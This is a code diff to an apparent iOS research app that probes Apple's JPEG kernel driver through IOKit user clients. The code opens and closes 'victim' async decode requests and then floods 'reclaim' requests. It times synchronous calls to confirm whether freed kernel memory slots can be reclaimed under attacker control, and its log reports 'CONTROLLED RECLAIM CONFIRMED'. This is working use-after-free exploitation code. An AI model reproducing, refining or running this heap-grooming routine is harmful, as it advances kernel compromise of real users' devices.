@@ -1990,10 +1990,10 @@ done:
     if (self.running) return;
     self.running = YES;
     [UIView animateWithDuration:0.2 animations:^{ self.logView.alpha = 1.0; }];
-    [self setStatus:@"P3Bp: progressive reclaim..."];
+    [self setStatus:@"P3Bp v2: interleaved..."];
 
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self log:@"=== P3Bp: progressive reclaim timing ==="];
+        [self log:@"=== P3Bp v2: interleaved prog0/prog1 + srcID ctrl ==="];
         io_service_t svc = [self findJPEGService];
         if (!svc) { [self log:@"no service"]; self.running = NO; return; }
         BOOL healthy = [self checkDriverHealth:svc];
@@ -2003,66 +2003,71 @@ done:
         NSData *jpegData = [self createTestJPEG:W height:H];
         IOSurfaceRef vSrc = [self createSourceSurface:jpegData];
         IOSurfaceRef vDst = [self createDestSurface:W height:H];
-        IOSurfaceRef rSrc = [self createSourceSurface:jpegData];
+        IOSurfaceRef rSrc0 = [self createSourceSurface:jpegData];
+        IOSurfaceRef rSrc1 = [self createSourceSurface:jpegData];
         IOSurfaceRef rDst = [self createDestSurface:W height:H];
-        if (!vSrc||!vDst||!rSrc||!rDst) { IOObjectRelease(svc); self.running=NO; return; }
+        if (!vSrc||!vDst||!rSrc0||!rSrc1||!rDst) { IOObjectRelease(svc); self.running=NO; return; }
         uint32_t vS=IOSurfaceGetID(vSrc), vD=IOSurfaceGetID(vDst);
-        uint32_t rS=IOSurfaceGetID(rSrc), rD=IOSurfaceGetID(rDst);
+        uint32_t r0=IOSurfaceGetID(rSrc0), r1=IOSurfaceGetID(rSrc1), rD=IOSurfaceGetID(rDst);
 
         mach_timebase_info_data_t tbi; mach_timebase_info(&tbi);
-        const int DOSE=5, CYCLES=30, R_CONNS=3, R_REQS=5;
+        const int DOSE=5, CYCLES=40, R_CONNS=3, R_REQS=5;
 
-        uint64_t (^syncTrigger)(void) = ^uint64_t{
-            io_connect_t t = [self openUC:svc];
-            if (!t) return 0;
-            AppleJPEGDriverIOStruct in={0},out={0};
-            in.sourceID=rS; in.field_04=W*H; in.destID=rD; in.field_0C=W*H*4;
-            in.width=W; in.height=H; in.outWidth=W; in.outHeight=H;
-            in.subsampling=3; in.asyncToken=0;
-            size_t os=sizeof(out);
-            uint64_t t0=mach_absolute_time();
-            IOConnectCallStructMethod(t,1,&in,sizeof(in),&out,&os);
-            uint64_t t1=mach_absolute_time(); IOServiceClose(t);
-            return (t1-t0)*tbi.numer/tbi.denom/1000;
+        uint64_t (^runPhaseSrc)(uint32_t srcID, BOOL prog, uint64_t tokenBase) = ^uint64_t(uint32_t srcID, BOOL prog, uint64_t tokenBase){
+            io_connect_t vc = [self openUC:svc];
+            if (vc) { [self submitAsyncRequestsFlags:vc srcID:vS dstID:vD width:W height:H count:DOSE tokenBase:tokenBase progressive:NO]; IOServiceClose(vc); }
+            usleep(500);
+            io_connect_t rcs[3]; int rn=0;
+            for (int r=0;r<R_CONNS;r++){ io_connect_t rc=[self openUC:svc]; if(rc){ [self submitAsyncRequestsFlags:rc srcID:srcID dstID:rD width:W height:H count:R_REQS tokenBase:tokenBase+0x100+r progressive:prog]; rcs[rn++]=rc; } }
+            io_connect_t t=[self openUC:svc];
+            uint64_t us=0;
+            if(t){
+                AppleJPEGDriverIOStruct in={0},out={0};
+                in.sourceID=srcID; in.field_04=W*H; in.destID=rD; in.field_0C=W*H*4;
+                in.width=W; in.height=H; in.outWidth=W; in.outHeight=H;
+                in.subsampling=3; in.asyncToken=0;
+                size_t os=sizeof(out);
+                uint64_t t0=mach_absolute_time();
+                IOConnectCallStructMethod(t,1,&in,sizeof(in),&out,&os);
+                us=(mach_absolute_time()-t0)*tbi.numer/tbi.denom/1000;
+                IOServiceClose(t);
+            }
+            for(int r=0;r<rn;r++) IOServiceClose(rcs[r]);
+            return us;
         };
 
-        // A0: victim, reclaim(prog=0) — baseline
-        uint64_t timP0[CYCLES]; int np0=0;
-        [self log:@"  A0: victim + reclaim(prog=0)..."];
+        // Interleaved: чередуем A0/A1/A0/A1...
+        uint64_t tim0[CYCLES], tim1[CYCLES]; int n0=0, n1=0;
         for (int c=0; c<CYCLES; c++) {
-            io_connect_t vc=[self openUC:svc];
-            if(vc){ [self submitAsyncRequestsFlags:vc srcID:vS dstID:vD width:W height:H count:DOSE tokenBase:0xA000+c progressive:NO]; IOServiceClose(vc); }
-            usleep(1000);
-            io_connect_t rcs[3]; int rn=0;
-            for(int r=0;r<R_CONNS;r++){ io_connect_t rc=[self openUC:svc]; if(rc){ [self submitAsyncRequestsFlags:rc srcID:rS dstID:rD width:W height:H count:R_REQS tokenBase:0xC000+c*0x10+r progressive:NO]; rcs[rn++]=rc; } }
-            uint64_t us = syncTrigger(); if(us) timP0[np0++]=us;
-            for(int r=0;r<rn;r++) IOServiceClose(rcs[r]);
+            // A0: reclaim src0, prog=0
+            uint64_t u0 = runPhaseSrc(r0, NO, 0xA000 + c*0x100);
+            if (u0) tim0[n0++]=u0;
+            // A1: reclaim src1, prog=1
+            uint64_t u1 = runPhaseSrc(r1, YES, 0xC000 + c*0x100);
+            if (u1) tim1[n1++]=u1;
+            if ((c+1)%10==0) {
+                BOOL h=[self checkDriverHealth:svc];
+                [self log:@"  [%d/40] n0=%d n1=%d health=%@", c+1, n0, n1, h?@"OK":@"BROKEN"];
+                if(!h) break;
+            }
         }
 
-        // A1: victim, reclaim(prog=1) — прогрессивная ветка должна быть активна
-        uint64_t timP1[CYCLES]; int np1=0;
-        [self log:@"  A1: victim + reclaim(prog=1)..."];
-        for (int c=0; c<CYCLES; c++) {
-            io_connect_t vc=[self openUC:svc];
-            if(vc){ [self submitAsyncRequestsFlags:vc srcID:vS dstID:vD width:W height:H count:DOSE tokenBase:0xA000+c progressive:NO]; IOServiceClose(vc); }
-            usleep(1000);
-            io_connect_t rcs[3]; int rn=0;
-            for(int r=0;r<R_CONNS;r++){ io_connect_t rc=[self openUC:svc]; if(rc){ [self submitAsyncRequestsFlags:rc srcID:rS dstID:rD width:W height:H count:R_REQS tokenBase:0xC000+c*0x10+r progressive:YES]; rcs[rn++]=rc; } }
-            uint64_t us = syncTrigger(); if(us) timP1[np1++]=us;
-            for(int r=0;r<rn;r++) IOServiceClose(rcs[r]);
+        void (^sort)(uint64_t*, int) = ^(uint64_t *arr, int n){ for(int i=0;i<n-1;i++) for(int j=i+1;j<n;j++) if(arr[i]>arr[j]){uint64_t t=arr[i];arr[i]=arr[j];arr[j]=t;} };
+        sort(tim0, n0); sort(tim1, n1);
+        uint64_t m0=n0?tim0[n0/2]:0, m1=n1?tim1[n1/2]:0;
+        [self log:@""];
+        [self log:@"  RESULT interleaved: prog0=%llu prog1=%llu us diff=%+lld", m0, m1, (int64_t)m1-(int64_t)m0];
+        [self log:@"  A0 n=%d A1 n=%d", n0, n1];
+        if (llabs((int64_t)m1-(int64_t)m0) > 200) {
+            [self log:@"  *** CONTROLLED RECLAIM CONFIRMED (diff>200us) ***"];
+        } else {
+            [self log:@"  diff < 200us: reclaim present but flag-offset not controlling timing"];
         }
 
-        void (^sort)(uint64_t *, int) = ^(uint64_t *arr, int n) { for(int i=0;i<n-1;i++) for(int j=i+1;j<n;j++) if(arr[i]>arr[j]){uint64_t t=arr[i];arr[i]=arr[j];arr[j]=t;} };
-        sort(timP0, np0); sort(timP1, np1);
-        uint64_t m0=np0?timP0[np0/2]:0, m1=np1?timP1[np1/2]:0;
-        [self log:@"  RESULT prog0=%llu prog1=%llu us diff=%+lld", m0, m1, (int64_t)m1-(int64_t)m0];
-        [self log:@"  (if diff != 0 -> controlled reclaim confirmed: prog flag in freed slot)"];
-
-        CFRelease(vSrc); CFRelease(vDst); CFRelease(rSrc); CFRelease(rDst);
+        CFRelease(vSrc); CFRelease(vDst); CFRelease(rSrc0); CFRelease(rSrc1); CFRelease(rDst);
         IOObjectRelease(svc);
-        dispatch_async(dispatch_get_main_queue(), ^{ [self setStatus:@"P3Bp done"]; });
+        dispatch_async(dispatch_get_main_queue(), ^{ [self setStatus:@"P3Bp v2 done"]; });
         self.running = NO;
     });
 }
-
 @end
